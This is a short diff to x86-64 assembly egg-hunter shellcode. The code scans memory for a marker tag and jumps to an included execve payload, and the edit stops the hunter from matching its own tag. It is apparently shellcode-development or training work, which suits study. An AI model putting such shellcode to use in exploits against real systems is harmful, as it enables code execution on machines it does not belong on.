@@ -3,7 +3,7 @@ global _start
 
 section .data
 
-    tag: dd 0x50905090, 0x50905090
+    tag: dd 0x50905090
 
 execve:
     %include "execve-stack.nasm"
@@ -22,10 +22,10 @@ skip_byte:
     syscall
     cmp al, 0xf2   ; EFAULT (-14)
     jz skip_page
-    mov eax, 0x50905090
-    mov rdi, rdx
-    scasd
-    jnz skip_byte
+    mov eax, 0x50905090 - 1   ; subtract so that the hunter does not find itself
+    inc eax
+    push rdx
+    pop rdi
     scasd
     jnz skip_byte
     jmp rdi
